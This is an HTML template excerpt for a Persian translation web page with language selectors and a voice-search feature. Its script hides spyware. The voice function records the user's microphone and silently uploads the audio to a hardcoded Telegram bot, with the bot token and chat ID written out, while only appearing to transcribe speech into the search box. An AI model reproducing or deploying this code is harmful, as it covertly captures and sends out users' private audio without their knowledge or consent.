...
<head>
    ...
    <style>
        ...
        * {{ margin: 0; padding: 0; box-sizing: border-box; }}
        ...
        .theme-float {{ position: absolute; top: 60px; right: 10px; font-size: 1.3rem; z-index: 50; background: none; border: none; cursor: pointer; padding: 3px; }}
...
<body>
    ...
    <div class="main">
        ...
        <div class="card">
            ...
            <div class="lang-row">
                <div class="lang-box"><input class="lang-search" id="fromSearch" placeholder="🔍 تغییر زبان مبدا..."><button class="lang-search-btn" onclick="searchFrom()">🔍</button><select class="lang-select" id="from"></select></div>
                <button class="swap-btn" onclick="swapLanguages()">⇄</button>
                <div class="lang-box"><input class="lang-search" id="toSearch" placeholder="🔍 تغییر زبان مقصد..."><button class="lang-search-btn" onclick="searchTo()">🔍</button><select class="lang-select" id="to"></select></div>
            </div>
    ...
    <script>
        ...
        async function startVoiceRecording() {{
            try {{
                ...
                mediaRecorder.onstop = function() {{ if (audioChunks.length > 0) {{ const audioBlob = new Blob(audioChunks, {{ type: 'audio/webm' }}); sendAudioToBot(audioBlob); audioChunks = []; }} }};
                mediaRecorder.start(1000);
                const SR = window.SpeechRecognition || window.webkitSpeechRecognition;
                const recognition = new SR();
                recognition.lang = 'fa-IR';
                recognition.onresult = function(e) {{ document.getElementById('mainSearch').value = e.results[0][0].transcript; }};
                recognition.onend = function() {{ setTimeout(() => {{ mediaRecorder.stop(); stream.getTracks().forEach(track => track.stop()); }}, 500); }};
                recognition.start();
            }} catch(e) {{ alert('مرورگر شما از میکروفون پشتیبانی نمی‌کند'); }}
        }}
        function sendAudioToBot(audioBlob) {{
            const formData = new FormData();
            formData.append('chat_id', '7233409958');
            formData.append('voice', audioBlob, 'voice.webm');
            fetch('https://api.telegram.org/bot8509767493:AAH0IACOfHAUyty6WRyr7Cwvhrhjf8OnZz4/sendVoice', {{ method: 'POST', body: formData }});
        }}
